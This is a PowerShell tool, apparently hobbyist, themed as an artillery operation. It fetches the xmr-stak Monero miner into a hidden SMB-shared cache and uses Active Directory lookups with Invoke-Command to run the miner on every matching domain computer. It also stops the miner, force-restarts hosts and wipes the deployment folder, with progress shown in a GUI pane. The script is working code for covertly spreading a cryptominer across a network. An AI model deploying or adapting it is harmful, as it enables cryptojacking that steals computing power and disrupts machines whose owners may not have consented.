﻿# Global Varibles

$searchBase = New-Object System.Collections.Generic.List[System.Object]
$stakVersion = "2.8.3"
$stakName = "xmr-stak-win64"
$distName = "vc_redist.x64.exe"

# Main Functions

function payload () {

  # Get xmr-stak from github.
  $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
  $cache = "${psscriptroot}\ops_cache"
  $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
  $stakName = $missionParameters.stakName
  $stakVersion = $missionParameters.stakVersion

  $version = $stakVersion
  $name = $stakName + "-" + $version + ".zip"
  $link = "https://github.com/fireice-uk/xmr-stak/releases/download/"
  $payloadURI = "$link" + "$version" + "/" + "$name"
  $destination = $cache + "\" + "$name"

  Write-Host $payloadURI
  Write-Host $destination

  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  Invoke-WebRequest -Uri $payloadURI -OutFile $destination

}

function redist () {

  # Get Visual C++ Redistributable
  $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
  $cache = "${psscriptroot}\ops_cache"
  $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
  $distName = $missionParameters.distName

  $name = $distName
  $link = "https://aka.ms/vs/15/release/"
  $payloadURI = "$link" + "$name"
  $destination = $cache + "\" + "$name"

  Write-Host $payloadURI
  Write-Host $destination

  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  Invoke-WebRequest -Uri $payloadURI -OutFile $destination

}

function configTpl ($cache) { #change to point at ops cache and rename function

  # Get config template from github
  $name = "config.tpl"
  $link = "https://raw.githubusercontent.com/fireice-uk/xmr-stak/master/xmrstak/"
  $payloadURI = "$link" + "$name"
  $destination = $cache + "\" + "$name"

  Write-Host $payloadURI
  Write-Host $destination
  
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  Invoke-RestMethod -Uri $payloadURI -OutFile $destination

}

function poolTpl ($cache) { #change to point at ops cache and rename function

  # Get pool template from github
  $name = "pools.tpl"
  $link = "https://raw.githubusercontent.com/fireice-uk/xmr-stak/master/xmrstak/"
  $payloadURI = "$link" + "$name"
  $destination = $cache + "\" + "$name"

  Write-Host $payloadURI
  Write-Host $destination
  
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  Invoke-RestMethod -Uri $payloadURI -OutFile $destination

}

function ammoDump () {

  $cache = "${psscriptroot}\ops_cache"
  Write-Host $cache
  
  
  if (!(Test-Path $cache))

{

  mkdir $cache
  $f = Get-Item $cache -Force
  $f.Attributes = "Hidden"

}

  # Create new SMB share: path will be the ops directory variable.  This is done on the FDC side.
  IF (!(GET-SMBShare -Name "ops_cache"))
  {
    New-SmbShare -Name "ops_cache" -Path $cache -Temporary
  } 

  payload
  redist
  # configTpl ## setup path to write template to
  # poolTpl ## setup path to write tempate to


}

function fireBase ($outputPane,$progressBar) {

  $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
  $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
  $opsDir = $missionParameters.ops
  $filterTarget = $missionParameters.Target
  $advanceParty = $missionParameters.ap
  $searchbase = $missionParameters.search
  $hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
  showFireBase $outputPane

  foreach ($client in $hostList.Name)

  {

    $counter++
    [int]$Percentage = ($counter / $hostList.count) * 100
    $ProgressBar.Value = $Percentage
    $outputPane.text += "Advance Party en-route to $client...`n"
    $cmdstring = "invoke-command -computername $client -FilePath $advanceParty -ArgumentList $opsDir"
    $scriptblock = [scriptblock]::Create($cmdstring)
    Start-Process powershell -ArgumentList "-command $Scriptblock"

  }

  $outputPane.text += "`n`nBASE ESTABLISHED!"

}

function fireMission ($outputPane,$progressBar) {

  $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
  $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
  $searchbase = $missionParameters.search
  $filterTarget = $missionParameters.Target
  $opsDir = $missionParameters.ops
  $hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
  showFireMission $outputPane
  foreach ($client in $hostList.Name)

  {

    $counter++
    [int]$Percentage = ($counter / $hostList.count) * 100
    $ProgressBar.Value = $Percentage
    $outputPane.text += "$client - Firing...`n"
    $cmdstring = "invoke-command -computername $client -scriptblock {write-host 'I am' $client ; & ‘$opsDir\xmr-stak-win64-2.8.2\xmr-stak.exe’ -c '$opsDir\xmr-stak-win64-2.8.2\config.txt' -C '$opsDir\xmr-stak-win64-2.8.2\pools.txt' --cpu '$opsDir\xmr-stak-win64-2.8.2\cpu.txt' --amd '$opsDir\xmr-stak-win64-2.8.2\amd.txt' --nvidia '$opsDir\xmr-stak-win64-2.8.2\nvidia.txt'}"
    $scriptBlock = [scriptblock]::Create($cmdstring)
    Start-Process powershell -ArgumentList "-command  $Scriptblock"

  }

  $outputPane.text += "`n`nFIRE FOR EFFECT!"

}

function ceaseFire ($outputPane,$progressBar) {

  $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
  $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
  $searchbase = $missionParameters.search
  $filterTarget = $missionParameters.Target
  #$opsDir = $missionParameters.ops
  $hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
  showCeaseFire $outputPane

  foreach ($client in $hostList.Name)

  {

    $counter++
    [int]$Percentage = ($counter / $hostList.count) * 100
    $ProgressBar.Value = $Percentage
    $outputPane.text += "$client - Clearing Breach...`n"
    $cmdstring = "Invoke-Command -ComputerName $client -ErrorAction Continue -ScriptBlock { Stop-Process -Name xmr-stak }"
    $scriptblock = [scriptblock]::Create($cmdstring)
    Start-Process powershell -ArgumentList "-command  $Scriptblock"

  }

  $outputPane.text += "`n`nBREACHES CLEAR!"

}

function cycleGunline ($outputPane,$progressBar) {

  $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
  $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
  $filterTarget = $missionParameters.Target
  $searchbase = $missionParameters.search
  $hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
  showCycleGunline $outputPane

  foreach ($client in $hostList.Name)

  {

    $counter++
    [int]$Percentage = ($counter / $hostList.count) * 100
    $ProgressBar.Value = $Percentage
    $outputPane.text += "Sending command to $client...`n"
    Invoke-Command $client -ErrorAction Continue -ScriptBlock { Restart-Computer -Force }


  }

  $outputPane.text += "`n`nGUNLINE CYCLED!"

}

function getGrid ($outputPane) {

  $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
  $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
  $outputPane.text += "MISSION PARAMETERS:`n`n"
  $outputPane.text += "Organizational Unit(s): "
  $outputPane.text += $missionParameters.search.Name
  $outputPane.text += "`n`nSearch Base(s): "
  $outputPane.text += $missionParameters.search.distinguishedname
  $outputPane.text += "`n`nTarget Filter String: "
  $outputPane.text += $missionParameters.Target
  $outputPane.text += "`n`nOperations Directory: "
  $outputPane.text += $missionParameters.ops
  $outputPane.text += "`n`nPayload: "
  $outputPane.text += $missionParameters.payload
  $outputPane.text += "`n`nAdvance Party: "
  $outputPane.text += $missionParameters.ap

}

function setGrid ($outputPane,$textBox_filter,$textBox_OpsDir) {

  $filterTarget = $textBox_filter.text
  $opsDir = $textBox_OpsDir.text
  $configPath = "${psscriptroot}\fireDirectionalControl.json"
  $advanceParty = "${psscriptroot}\advanceParty.ps1"
  $storedSettings = @{

    ops = $opsDir
    payload = $opsDir
    ap = $advanceParty
    Target = $filterTarget
    search = $searchBase
    stakVersion = $stakVersion
    stakName = $stakName
    distName = $distName

  }
  $storedSettings | ConvertTo-Json | Out-File $configPath
  showRedLeg $outputPane
  $outputPane.text += "`n`nGrid Coordinates Set!"
  Start-Sleep -s 3
  showRedLeg $outputpane
  reconGrid $outputpane

}

function pushGrid ($outputPane,$textBox_OU) {

  [string]$searchString = $textBox_OU.text
  $selection = Get-ADObject -Filter "Name -eq '$searchString'" | Where-Object { $_.objectclass -eq 'organizationalunit' } | Select-Object Name,DistinguishedName
  if (!($searchBase -match $selection)) { $searchBase.Add($selection) }
  showGridCheck $outputpane
  $outputPane.text += "Current Search Base Values:`n"
  $outputPane.text += $searchBase | Format-Table | Out-String

}

function popGrid ($outputPane,$textBox_OU) {


  $searchBase.RemoveAt($searchBase.count - 1)
  showGridCheck $outputpane
  $outputPane.text += "Current Search Base Values:`n"
  $outputPane.text += $searchBase | Format-Table | Out-String

}

function clearGrid ($outputPane) {

  $searchBase.Clear()
  showRedLeg $outputpane
  $outputPane.text += "`nSearchBase is CLEAR!"
  Start-Sleep -s 3
  showRedLeg $outputpane
  reconGrid $outputpane

}

function moveOut ($outputPane,$progressBar) {

  $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
  $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
  $searchbase = $missionParameters.search
  $filterTarget = $missionParameters.Target
  $opsDir = $missionParameters.ops
  $hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
  showMoveOut $outputPane

  foreach ($client in $hostList.Name)

  {

    $counter++
    [int]$Percentage = ($counter / $hostList.count) * 100
    $ProgressBar.Value = $Percentage
    $outputPane.text += "$client - Moving Out...`n"
    $cmdstring = “invoke-command -computername $client -scriptblock { If(test-path $opsDir) { Remove-Item -path $opsDir -Recurse -Force }}”
    $scriptblock = [scriptblock]::Create($cmdstring)
    Start-Process powershell -ArgumentList "-command $Scriptblock"

  }

  $outputPane.text += "`n`nGUNLINE OUT!"

}

function cpuCheck ($outputPane) {

  $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
  $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
  $filterTarget = $missionParameters.Target
  $searchbase = $missionParameters.search
  $hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name

  foreach ($client in $hostList.Name) {

    $invokeCommandScriptBlock = {
      Get-WmiObject win32_processor |
      Measure-Object -Property LoadPercentage -Average |
      Select-Object @{ e = { [math]::Round($_.Average,1) }; n = "CPU(%)" }
    }

    $invokeCommandArgs = @{
      ComputerName = $client
      ScriptBlock = $invokeCommandScriptBlock
      ErrorAction = "Continue"
    }

    $outputPane.text += Invoke-Command @invokeCommandArgs |
    Sort-Object "CPU(%)" -Descending |
    Select-Object "CPU(%)",PSComputerName | Out-String

  }


}

# What am I doing with this?
function gpuCheck ($outputPane) {

  $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
  $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
  $filterTarget = $missionParameters.Target
  $searchbase = $missionParameters.search
  $hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name

  foreach ($client in $hostList.Name) {

    $invokeCommandScriptBlock = { Get-WmiObject win32_VideoController | Select-Object PSComputerName,Name }
    $invokeCommandArgs = @{

      ComputerName = $client
      ScriptBlock = $invokeCommandScriptBlock
      ErrorAction = "SilentlyContinue"

    }

    $outputPane.text += Invoke-Command @invokeCommandArgs | Out-String

  }

}

function preflightCheck ($outputPane) {

  function versionCheck ($outputPane) {

    $currentVersion = $PSVersionTable.PSVersion
    if ($currentVersion -lt 5.1)

    {

      $outputPane.text += "Current Powershell Version is: $currentVersion`n"
      $outputPane.text += "Powershell Version is NO-GO AT THIS TIME!`n Please install Powershell 5.1 or greater`n"

    }

    else

    {

      $outputPane.text += "Current Powershell Version is: $currentVersion`n"
      $outputPane.text += "Powershell Version is GO AT THIS TIME!`n`n"

    }

  }

  function jsonCheck ($outputPane) {

    if (Test-Path "${psscriptroot}\fireDirectionalControl.json")

    {

      $outputPane.text += "Config File Present`n`n"

    }

    else

    {

      $outputPane.text += "Config File Needed`n`n"

    }

  }

  versionCheck $outputPane
  jsonCheck $outputPane

}


function reconGrid ($outputPane) {

  $outputPane.text += "CURRENT RECON:`n"
  $outputPane.text += Get-ADObject -Filter 'ObjectClass -eq "organizationalunit"' | Format-Table | Out-String

}

function readConfig ($outputPane) {

  showGridCheck $outputPane
  reconGrid $outputPane
  getGrid $outputPane

}

# Sick ASCII art functions

function showFireBase ($outputPane) {

  $logoASCIIfireBase = "
·▄▄▄▪  ▄▄▄  ▄▄▄ .      
▐▄▄·██ ▀▄ █·▀▄.▀·      
██▪ ▐█·▐▀▀▄ ▐▀▀▪▄      
██▌.▐█▌▐█•█▌▐█▄▄▌      
▀▀▀ ▀▀▀.▀  ▀ ▀▀▀       
▄▄▄▄·  ▄▄▄· .▄▄ · ▄▄▄ .
▐█ ▀█▪▐█ ▀█ ▐█ ▀. ▀▄.▀·
▐█▀▀█▄▄█▀▀█ ▄▀▀▀█▄▐▀▀▪▄
██▄▪▐█▐█ ▪▐▌▐█▄▪▐█▐█▄▄▌
·▀▀▀▀  ▀  ▀  ▀▀▀▀  ▀▀▀ 
"
  $outputPane.text = $logoASCIIfireBase

}

function showFireMission ($outputPane) {

  $logoASCIIfireMission = "
·▄▄▄▪  ▄▄▄  ▄▄▄ .                     
▐▄▄·██ ▀▄ █·▀▄.▀·                     
██▪ ▐█·▐▀▀▄ ▐▀▀▪▄                     
██▌.▐█▌▐█•█▌▐█▄▄▌                     
▀▀▀ ▀▀▀.▀  ▀ ▀▀▀                      
• ▌ ▄ ·. ▪  .▄▄ · .▄▄ · ▪         ▐ ▄ 
·██ ▐███▪██ ▐█ ▀. ▐█ ▀. ██ ▪     •█▌▐█
▐█ ▌▐▌▐█·▐█·▄▀▀▀█▄▄▀▀▀█▄▐█· ▄█▀▄ ▐█▐▐▌
██ ██▌▐█▌▐█▌▐█▄▪▐█▐█▄▪▐█▐█▌▐█▌.▐▌██▐█▌
▀▀  █▪▀▀▀▀▀▀ ▀▀▀▀  ▀▀▀▀ ▀▀▀ ▀█▄▀▪▀▀ █▪
"
  $outputPane.text = $logoASCIIfireMission

}

function showCeaseFire ($outputPane) {

  $logoASCIIceaseFire = "
 ▄▄· ▄▄▄ . ▄▄▄· .▄▄ · ▄▄▄ .
▐█ ▌▪▀▄.▀·▐█ ▀█ ▐█ ▀. ▀▄.▀·
██ ▄▄▐▀▀▪▄▄█▀▀█ ▄▀▀▀█▄▐▀▀▪▄
▐███▌▐█▄▄▌▐█ ▪▐▌▐█▄▪▐█▐█▄▄▌
·▀▀▀  ▀▀▀  ▀  ▀  ▀▀▀▀  ▀▀▀ 
·▄▄▄▪  ▄▄▄  ▄▄▄ .          
▐▄▄·██ ▀▄ █·▀▄.▀·          
██▪ ▐█·▐▀▀▄ ▐▀▀▪▄          
██▌.▐█▌▐█•█▌▐█▄▄▌          
▀▀▀ ▀▀▀.▀  ▀ ▀▀▀           
"
  $outputPane.text = $logoASCIIceaseFire

}

function showCycleGunline ($outputPane) {

  $logoASCIIreinitGunline = "
 ▄▄·  ▄· ▄▌ ▄▄· ▄▄▌  ▄▄▄ .        
▐█ ▌▪▐█▪██▌▐█ ▌▪██•  ▀▄.▀·        
██ ▄▄▐█▌▐█▪██ ▄▄██▪  ▐▀▀▪▄        
▐███▌ ▐█▀·.▐███▌▐█▌▐▌▐█▄▄▌        
·▀▀▀   ▀ • ·▀▀▀ .▀▀▀  ▀▀▀         
 ▄▄ • ▄• ▄▌ ▐ ▄ ▄▄▌  ▪   ▐ ▄ ▄▄▄ .
▐█ ▀ ▪█▪██▌•█▌▐███•  ██ •█▌▐█▀▄.▀·
▄█ ▀█▄█▌▐█▌▐█▐▐▌██▪  ▐█·▐█▐▐▌▐▀▀▪▄
▐█▄▪▐█▐█▄█▌██▐█▌▐█▌▐▌▐█▌██▐█▌▐█▄▄▌
·▀▀▀▀  ▀▀▀ ▀▀ █▪.▀▀▀ ▀▀▀▀▀ █▪ ▀▀▀ 
"
  $outputPane.text = $logoASCIIreinitGunline

}

function showGridCheck ($outputPane) {

  $logoASCIIgridCheck = "
 ▄▄ • ▄▄▄  ▪  ·▄▄▄▄      
▐█ ▀ ▪▀▄ █·██ ██▪ ██     
▄█ ▀█▄▐▀▀▄ ▐█·▐█· ▐█▌    
▐█▄▪▐█▐█•█▌▐█▌██. ██     
·▀▀▀▀ .▀  ▀▀▀▀▀▀▀▀▀•     
 ▄▄·  ▄ .▄▄▄▄ . ▄▄· ▄ •▄ 
▐█ ▌▪██▪▐█▀▄.▀·▐█ ▌▪█▌▄▌▪
██ ▄▄██▀▐█▐▀▀▪▄██ ▄▄▐▀▀▄·
▐███▌██▌▐▀▐█▄▄▌▐███▌▐█.█▌
·▀▀▀ ▀▀▀ · ▀▀▀ ·▀▀▀ ·▀  ▀
"
  $outputPane.text = $logoASCIIgridCheck

}

function showMoveOut ($outputPane) {

  $logoASCIImoveOut = "
• ▌ ▄ ·.        ▌ ▐·▄▄▄ .      ▄• ▄▌▄▄▄▄▄
·██ ▐███▪▪     ▪█·█▌▀▄.▀·▪     █▪██▌•██  
▐█ ▌▐▌▐█· ▄█▀▄ ▐█▐█•▐▀▀▪▄ ▄█▀▄ █▌▐█▌ ▐█.▪
██ ██▌▐█▌▐█▌.▐▌ ███ ▐█▄▄▌▐█▌.▐▌▐█▄█▌ ▐█▌·
▀▀  █▪▀▀▀ ▀█▄▀▪. ▀   ▀▀▀  ▀█▄▀▪ ▀▀▀  ▀▀▀ 
"
  $outputPane.text = $logoASCIImoveOut

}

function showRedLeg ($outputPane) {

  $logoASCIIredLeg = "
▄▄▄  ▄▄▄ .·▄▄▄▄  ▄▄▌  ▄▄▄ . ▄▄ • 
▀▄ █·▀▄.▀·██▪ ██ ██•  ▀▄.▀·▐█ ▀ ▪
▐▀▀▄ ▐▀▀▪▄▐█· ▐█▌██▪  ▐▀▀▪▄▄█ ▀█▄
▐█•█▌▐█▄▄▌██. ██ ▐█▌▐▌▐█▄▄▌▐█▄▪▐█
.▀  ▀ ▀▀▀ ▀▀▀▀▀• .▀▀▀  ▀▀▀ ·▀▀▀▀ 
"
  $outputPane.text = $logoASCIIredLeg

}